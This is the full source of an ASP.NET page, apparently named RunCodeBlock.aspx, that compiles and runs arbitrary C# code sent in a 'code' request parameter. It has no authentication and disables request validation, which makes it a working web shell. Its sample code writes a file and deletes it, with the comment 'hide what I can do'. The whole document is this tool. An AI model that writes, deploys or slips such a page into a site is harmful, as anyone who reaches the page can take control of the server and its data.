<%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" %>

<!DOCTYPE html  >
<html>
<head>

    <title>RunCodeBlock.aspx v1[Lith 180929]</title>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            string strOutput = "\r\n\r\n";
            string strCode = Request["code"];
            string dlls = Request["dlls"]??"";
            if (null == strCode) return;

            code.Value = strCode;
            try
            {
                strOutput+=CSharpCompilerMin.RunCodeBlock(dlls.Split('|'), strCode);
            }
            catch (Exception ex)
            {
                strOutput += ex.GetBaseException().Message;
            }
            outPut.Text = strOutput;
        }
    </script>
</head>
<body>
    <form runat="server">
        <div>
            <input type="submit" />
        </div>
        dlls: 引入的dll,以“|”分隔,如 "System.dll|mscorlib.dll"
        <div> 
            <textarea runat="server" id="dlls" rows="1" cols="150"  ></textarea>
        </div>
        code:
        <div>
            <textarea runat="server" id="code" rows="20" cols="150">
string path = System.AppDomain.CurrentDomain.BaseDirectory+"cache.txt";
System.IO.File.AppendAllText(path,"I have much power!");
//hide what I can do
System.IO.File.Delete(path);
return  "RunCodeBlock v1, Check in at " + System.DateTime.Now.ToString();
            </textarea>
        </div>
        return:
        <div>
            <textarea rows="20" cols="150">
                <asp:Literal ID="outPut" runat="server" />
            </textarea>
        </div>
    </form>
</body>
</html>
<script runat="server">

    public class CSharpCompilerMin
    {

        #region Compile

        public static System.Reflection.Assembly Compile(string[] referencedAssemblies, params string[] sources)
        {

            Microsoft.CSharp.CSharpCodeProvider codeProvider = new Microsoft.CSharp.CSharpCodeProvider();


            System.CodeDom.Compiler.CompilerParameters param = new System.CodeDom.Compiler.CompilerParameters();

            param.GenerateInMemory = true;

            if (null != referencedAssemblies)
                foreach (string ra in referencedAssemblies)
                    param.ReferencedAssemblies.Add(ra);

            System.CodeDom.Compiler.CompilerResults cr = codeProvider.CompileAssemblyFromSource(param, sources);

            if (cr.Errors.HasErrors)
            {
                string strErr = "";
                foreach (System.CodeDom.Compiler.CompilerError err in cr.Errors)
                {
                    strErr += "\r\nLine: " + err.Line + " - " + err.ErrorText;
                }
                var e = new System.Exception(strErr);
                e.Data["CompilerError"] = cr.Errors;
                throw e;
            }
            return cr.CompiledAssembly;
        }
        #endregion

        #region RunCode
        public static object RunCode(string[] referencedAssemblies, string code, string typeName, string staticMethodName, params object[] args)
        {
            return Compile(referencedAssemblies, code).GetType(typeName).GetMethod(staticMethodName).Invoke(null, new object[] { args });
        }
        #endregion

        #region RunCodeBlock
        public static object RunCodeBlock(string[] referencedAssemblies, string codeBlock, params object[] args)
        {
            codeBlock = @"             
namespace CodeCompilerCache
{
    public class StaticClass
    {
        public static object Func(object[] arg)
        {
            " + codeBlock + @"
            return  null;
        }
    }
}";
            return Compile(referencedAssemblies, codeBlock).GetType("CodeCompilerCache.StaticClass").GetMethod("Func").Invoke(null, new object[] { args });
        }
        #endregion

    }
</script>
